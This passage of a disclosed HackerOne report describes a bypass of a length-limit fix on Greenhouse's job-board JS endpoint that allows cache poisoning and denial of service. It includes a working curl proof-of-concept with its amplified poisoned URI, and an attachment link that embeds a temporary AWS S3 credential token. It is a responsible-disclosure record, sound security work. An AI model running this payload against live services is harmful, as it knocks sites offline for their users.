+            "message": "Hey @rongutierrez, thanks for the reply. I was just a little disappointed because I would have considered this report as a separate issue from #334709, considering that this was exclusively focused on bypassing the length limit restriction, while the previous report was focused on reflecting arbitrary content. I would have thought that bounty reward amounts are determined based on the severity of the issue, and the differentiating of reports from each other should be based on whether the exploits used are distinct from each other, rather than whether the same solution that can be used to fix the bugs behind both exploits.\n\nI hope you could take that into consideration, or correct me if I am wrong in this regard. Nevertheless, I understand and respect the company's decision, as the final decision ultimately lies with you guys. ", 
+            "markdown_message": "<p>Hey <a href=\"/rongutierrez\">@rongutierrez</a>, thanks for the reply. I was just a little disappointed because I would have considered this report as a separate issue from <a href=\"/reports/334709\">#334709</a>, considering that this was exclusively focused on bypassing the length limit restriction, while the previous report was focused on reflecting arbitrary content. I would have thought that bounty reward amounts are determined based on the severity of the issue, and the differentiating of reports from each other should be based on whether the exploits used are distinct from each other, rather than whether the same solution that can be used to fix the bugs behind both exploits.</p>\n\n<p>I hope you could take that into consideration, or correct me if I am wrong in this regard. Nevertheless, I understand and respect the company&#39;s decision, as the final decision ultimately lies with you guys. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2752177, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-22T16:12:55.986Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-22T16:12:55.986Z", 
+            "actor": {
+                "username": "irvinlim", 
+                "url": "/irvinlim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/182/993/6b3b063d650a8407f0a8b4ddec246be42b060b76_medium.jpg?1499865377"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "greenhouse", 
+            "message": "Hey @rongutierrez, just wondering if there are any updates regarding this bug?", 
+            "markdown_message": "<p>Hey <a href=\"/rongutierrez\">@rongutierrez</a>, just wondering if there are any updates regarding this bug?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3082199, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-06T18:54:26.865Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-06T18:54:26.865Z", 
+            "actor": {
+                "username": "rongutierrez", 
+                "url": "/rongutierrez", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "greenhouse", 
+            "message": "Hi @irvinlim, \n\nWe pushed out a fix for this. If you find any issues with the implementation you can open up a new submission. Thanks again for reporting the vulnerability. ", 
+            "markdown_message": "<p>Hi <a href=\"/irvinlim\">@irvinlim</a>, </p>\n\n<p>We pushed out a fix for this. If you find any issues with the implementation you can open up a new submission. Thanks again for reporting the vulnerability. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3152306, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "irvinlim", 
+                "url": "/irvinlim"
+            }, 
+            "created_at": "2018-08-06T18:54:35.706Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-06T18:54:35.706Z", 
+            "actor": {
+                "username": "rongutierrez", 
+                "url": "/rongutierrez", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "greenhouse", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 3152312, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-17T14:22:10.327Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-17T14:22:10.327Z", 
+            "actor": {
+                "username": "irvinlim", 
+                "url": "/irvinlim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/182/993/6b3b063d650a8407f0a8b4ddec246be42b060b76_medium.jpg?1499865377"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "greenhouse", 
+            "message": "Thanks for the update @rongutierrez! Indeed it looks like the bug has been fixed. Do you mind sharing what the fix was, whether it was to avoid reflecting the URL parameter directly in the JS file?\n\nIn addition, could we disclose this report, as well as the previous one - #334709?", 
+            "markdown_message": "<p>Thanks for the update <a href=\"/rongutierrez\">@rongutierrez</a>! Indeed it looks like the bug has been fixed. Do you mind sharing what the fix was, whether it was to avoid reflecting the URL parameter directly in the JS file?</p>\n\n<p>In addition, could we disclose this report, as well as the previous one - <a href=\"/reports/334709\">#334709</a>?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3210636, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-17T14:22:19.567Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-17T14:22:19.567Z", 
+            "actor": {
+                "username": "irvinlim", 
+                "url": "/irvinlim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/182/993/6b3b063d650a8407f0a8b4ddec246be42b060b76_medium.jpg?1499865377"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "greenhouse", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3210637, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-16T14:22:20.174Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-16T14:22:20.174Z", 
+            "actor": {
+                "url": "/greenhouse", 
+                "profile": {
+                    "name": "Greenhouse.io"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/312/d8a5615eac371f9e26a4ab3e56b8c32370280a0c_medium.jpg?1412369170"
+                }
+            }, 
+            "team_handle": "greenhouse", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3345473, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "irvinlim", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/irvinlim", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/182/993/c9322dca355926cea90172b8df990f60e471712a_small.jpg?1499865377"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 48, 
+        "name": "Denial of Service"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -7026881.949485707, 
+    "disclosed_at": "2018-09-16T14:22:20.116Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/350847", 
+    "created_at": "2018-05-12T11:16:29.910Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"summary\">Summary</h2>\n\n<p>This is a bypass of the fix that was introduced in response to report <a href=\"/reports/334709\">#334709</a>. The bug in question was that it was possible to poison the cache of the generated JS file at <a title=\"https://boards.greenhouse.io/embed/job_board/js?for=surveymonkey\" href=\"/redirect?signature=282e65ec3e78b1748b6f81a7804569c6e27002fa&amp;url=https%3A%2F%2Fboards.greenhouse.io%2Fembed%2Fjob_board%2Fjs%3Ffor%3Dsurveymonkey\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://boards.greenhouse.io/embed/job_board/js?for=surveymonkey</span><i class=\"icon-external-link\"></i></a>, by appending a URL-encoded NULL byte (<code>%00</code>), followed by an arbitrary string of characters. I found in that report that it was possible to cause a denial of service by making the resultant <code>applicationURI</code> and <code>boardURI</code> parameters too long such that the server rejects any request, causing a <code>ERR_CONNECTION_CLOSED</code> error. As clarified with <a href=\"/rongutierrez\">@rongutierrez</a>, the temporary fix implemented in <a href=\"/reports/334709\">#334709</a> was to limit the length of the request URI, which was sufficient to prevent the DoS in my PoC in that report.</p>\n\n<p>However, even though I found that the length restriction was 1024 bytes, I managed to bypass this length restriction by using multi-byte UTF-8 characters, which get expanded into up to 12 URL-encoded bytes, which results in me being able to poison the cache once again, making the resultant <code>applicationURI</code> parameter greater than the limit allowed by the server, resulting in a DoS once again.</p>\n\n<h2 id=\"description\">Description</h2>\n\n<p>I found that the request URI was restricted to 1024 characters AFTER decoding, which was evident from trial and error. This meant that <code>%00</code> was treated as 1 character, even though the input was 3 bytes long. Since the number of characters is limited to 1024, we have the following:</p>\n\n<ul>\n<li>24 characters for the path segment, including the query string: <code>/embed/job_board/js?for=</code>\n</li>\n<li>1 character for the NULL byte <code>%00</code> <u>after</u> decoding</li>\n<li>Variable length in bytes for the board token, minimum 1 byte</li>\n<li>998 characters remaining for our payload</li>\n</ul>\n\n<p>The length for the resultant URI (in bytes) we had to hit to cause a DoS, was at least 6169 bytes (approximately) as established in the previous report. This consists of:</p>\n\n<ul>\n<li>49 bytes for the URI prefix, including the hostname: <code>https://boards.greenhouse.io/embed/job_board?for=</code>\n</li>\n<li>3 bytes for the NULL byte <code>%00</code> <u>after</u> encoding</li>\n<li>Variable length in bytes for the board token, minimum 1 byte</li>\n<li>6116 bytes remaining that will arise from our payload</li>\n</ul>\n\n<p>Meanwhile, I had a theory that UTF-8 characters would be treated as a single character as well. This meant that for a single character like &quot;\u2665&quot;, this is a 3-byte UTF-8 character, that gets URL encoded into <code>%E2%99%A5</code>, which is 9 bytes long. We can even use a 4-byte UTF-8 character which would give us 12 URL encoded bytes. This means that, even though we only have 998 characters, we can amplify this by up to a factor of 12x.</p>\n\n<p>True enough by sending a request, using &quot;\u2665&quot; as our repeated payload 992 times, we can poison the cache with an amplified result as follows:</p>\n<pre class=\"highlight shell\"><code><span class=\"c\">#!/bin/sh</span>\n\n<span class=\"nv\">REPEAT</span><span class=\"o\">=</span>992\n<span class=\"nv\">ID</span><span class=\"o\">=</span>623145\ncurl --http1.1 -s <span class=\"s2\">&quot;https://boards.greenhouse.io/embed/job_board/js?for=a%00</span><span class=\"sb\">`</span>python -c <span class=\"s1\">&#39;print(\\&quot;\u2665\\&quot; * &#39;</span><span class=\"nv\">$REPEAT</span><span class=\"s1\">&#39;)&#39;</span><span class=\"sb\">`</span><span class=\"nv\">$ID</span><span class=\"s2\">&quot;</span> -v\n</code></pre>\n<p>This produces the following URI for the <code>boardURI</code> parameter:</p>\n<pre class=\"highlight plaintext\"><code>https://boards.greenhouse.io/embed/job_board?for=a%00%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5623145\n</code></pre>\n<p>This is 8987 characters in the URI prefix alone, which is beyond the 6169 bytes limit that causes the <code>ERR_CONNECTION_CLOSED</code> error in the previous report. This results in a similar DoS which is not mitigated.</p>\n\n<p>The execution log can be found in <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"execution-log.txt\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/296/561/01436c4af0d16eb3043392d4c07e781c6e242e7c/execution-log.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221701Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=bd5926fe99ae3e1fecf1d048cc7bdb854035b04209ee4e5528cabf5ae113dc6a\" data-attachment-type=\"text/plain\">execution-log.txt (F296561)</a>.</p>\n\n<h2 id=\"recommended-fix\">Recommended Fix</h2>\n\n<p>We can see that the previously implemented fix to limit the length of the request URI string to 1024 characters was insufficient, since we only need 510 times 12 bytes of URL encoded 4-byte UTF-8 characters to cause a DoS, assuming that the board token is a single byte (<code>a</code>).</p>\n\n<p>As mentioned in the previous report <a href=\"/reports/334709\">#334709</a>, it is much, much more foolproof to perform a whitelisting of the board token in the URL.</p>\n\n<p>Alternatively, since it seems that this endpoint requires fetching of data from the database based on the board token that was extracted from the query string parameter, instead of reflecting the <code>for</code> parameter into the <code>boardURI</code>/<code>applicationURI</code> parameter in the JS file, why not take the value from the database instead, since it&#39;s guaranteed that it will not be unsafe?</p>\n\n<p>Alternatively, you can choose to limit the request length further to a smaller size (maybe less than 500), but if your application server is able to maybe read UTF-16 or UTF-32 this would come to the same result once again, though I don&#39;t think that it&#39;s really possible.</p>\n\n<p>The recommended fix is really to not <u>reflect</u> the untrusted user&#39;s input which would be reflected onto the cache-poisoned file, regardless if you validate the input query string parameter, or to just take the board token URI from the database and not the request URI. 